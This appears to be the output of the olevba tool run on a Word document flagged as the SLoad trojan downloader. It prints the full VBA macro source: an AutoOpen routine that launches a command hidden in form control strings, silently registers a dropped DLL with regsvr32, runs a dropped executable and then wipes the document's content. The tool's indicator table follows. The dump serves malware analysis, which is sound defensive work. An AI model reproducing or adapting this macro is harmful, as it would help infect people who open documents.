olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm3.frm 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0 - OLE stream: 'Macros/VBA/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0 - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CheckBox1_Click()

End Sub

Private Sub OptionButton1_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0 - OLE stream: 'Macros/VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit



Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32.dll" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare PtrSafe Function CloseHandle Lib "kernel32.dll" (ByVal hObject As Long) As Long
Private Declare PtrSafe Function CreateProcessA Lib "kernel32.dll" (ByVal lpApplicationName As Long, ByVal lpCommandLine As _
String, ByVal lpProcessAttributes As Long, ByVal _
lpThreadAttributes As Long, ByVal bInheritHandles As Long, _
ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, _
ByVal lpCurrentDirectory As Long, lpStartupInfo As _
STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long

Private Const NORMAL_PRIORITY_CLASS = &H20&
Private Const XsMRbZdDRU = -1&
Private Const EWEhaIjuJ = &H8000000

Public Function GetOSName()
On Error GoTo Fejl
Dim ObjWMIservice As Object, ColItems As Object, ObjItem As Object

Set ObjWMIservice = GetObject("winmgmts:" & UserForm3.ListBox1.ControlTipText)
Set ColItems = ObjWMIservice.ExecQuery("SELECT * FROM Win32_OperatingSystem", , 48)
For Each ObjItem In ColItems
GetOSName = ObjItem.Name
Next

GetOSName = Left(GetOSName, InStr(GetOSName, "|") - 1)
GetOSName = Trim(Mid(GetOSName, InStr(15, GetOSName, " "), 4))
Select Case GetOSName
Case 10: GetOSName = 10
Case 8.1: GetOSName = 8
Case 7.1, 7: GetOSName = 7
Case Else: GetOSName = 5
End Select
Set ObjItem = Nothing
Set ColItems = Nothing
Set ObjWMIservice = Nothing
ExitHer:
Exit Function
Fejl:
MsgBox Err.Description, , ""
Resume ExitHer
End Function

Sub AutoOpen()
If GetOSName = 10 Then
Win10
Else
Win7
End If

End Sub





Sub Win10()
On Error Resume Next
Dim jUyMBvHWi As PROCESS_INFORMATION
    Dim vdlDzSRsPnRPp As STARTUPINFO
    Dim MJmQsqgCBeHFN As Long
    Dim oKqSLSxGkjFBO As String

    oKqSLSxGkjFBO = UserForm1.CheckBox1.ControlTipText & UserForm1.OptionButton1.ControlTipText & "\DPGCCCdDNL.dll"
    MJmQsqgCBeHFN = CreateProcessA(0&, oKqSLSxGkjFBO, 0&, 0&, 1&, EWEhaIjuJ, 0&, 0&, vdlDzSRsPnRPp, jUyMBvHWi)

   
   WaitForSingleObject jUyMBvHWi.hProcess, XsMRbZdDRU
   
    CloseHandle MJmQsqgCBeHFN
      Dim minidipi As Long
    Dim baladala As PROCESS_INFORMATION, marabara As STARTUPINFO
    Dim jipiripi As String
    
    jipiripi = "regsvr32" & ".e" & "xe /s " & Environ("ALLUSERSPROFILE") & "\DPGCCCdDNL.dll"
    
    minidipi = CreateProcessA(0&, jipiripi, 0&, 0&, 1&, 0&, 0&, 0&, marabara, baladala)
    WaitForSingleObject baladala.hProcess, XsMRbZdDRU
    CloseHandle minidipi
    

    Dim goldend As Long
    Dim dindad As PROCESS_INFORMATION, kafaru As STARTUPINFO
    Dim mantrasu As String
    
    mantrasu = Environ("ALLUSERSPROFILE") & "\Local Tempary\d9d11x.ex" & "e COM2_"
    
    goldend = CreateProcessA(0&, mantrasu, 0&, 0&, 1&, 0&, 0&, 0&, kafaru, dindad)
    
    CloseHandle goldend
    PicAll
End Sub


Sub Win7()
On Error Resume Next
Dim jUyMBvHWi As PROCESS_INFORMATION
    Dim vdlDzSRsPnRPp As STARTUPINFO
    Dim MJmQsqgCBeHFN As Long
    Dim oKqSLSxGkjFBO As String

    oKqSLSxGkjFBO = UserForm3.TextBox1.ControlTipText & UserForm3.CheckBox1.ControlTipText & UserForm3.TextBox2.ControlTipText & "DPGCCCdDNL.dll')"
    MJmQsqgCBeHFN = CreateProcessA(0&, oKqSLSxGkjFBO, 0&, 0&, 1&, EWEhaIjuJ, 0&, 0&, vdlDzSRsPnRPp, jUyMBvHWi)

   
   WaitForSingleObject jUyMBvHWi.hProcess, XsMRbZdDRU
   
    CloseHandle MJmQsqgCBeHFN
      Dim minidipi As Long
    Dim baladala As PROCESS_INFORMATION, marabara As STARTUPINFO
    Dim jipiripi As String
    
    jipiripi = "regsvr32" & ".e" & "xe /s " & Environ("ALLUSERSPROFILE") & "\DPGCCCdDNL.dll"
    
    minidipi = CreateProcessA(0&, jipiripi, 0&, 0&, 1&, 0&, 0&, 0&, marabara, baladala)
    WaitForSingleObject baladala.hProcess, XsMRbZdDRU
    CloseHandle minidipi
    

    Dim goldend As Long
    Dim dindad As PROCESS_INFORMATION, kafaru As STARTUPINFO
    Dim mantrasu As String
    
    mantrasu = Environ("ALLUSERSPROFILE") & "\Local Tempary\d9d11x.ex" & "e COM2_"
    
    goldend = CreateProcessA(0&, mantrasu, 0&, 0&, 1&, 0&, 0&, 0&, kafaru, dindad)
    
    CloseHandle goldend
    PicAll
End Sub





Sub Asdjiasda()

    
End Sub

Sub iAJWDiqwodqo()

    
End Sub







Sub PicAll()


Dim myImageA As Shape

Set myImageA = ActiveDocument.Shapes("Picture 2")

myImageA.Delete

ThisDocument.Range.Text = ""

End Sub









-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0ahoOptionButton1�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CommandButton15
-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1ton
-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ToggleButton1�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1�1
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ToggleButton1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'HEUR-Trojan-Downloader.MSOffice.SLoad.gen-5761c2cd3985d74bf82d9c16e54a7ed69ffb5896c1325d9932d24265a6ffe3d0' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |DPGCCCdDNL.dll      |Executable file name                         |
|Hex String|\I-v                |5C492D76                                     |
|Hex String|s"'b:               |0B732227623A                                 |
+----------+--------------------+---------------------------------------------+

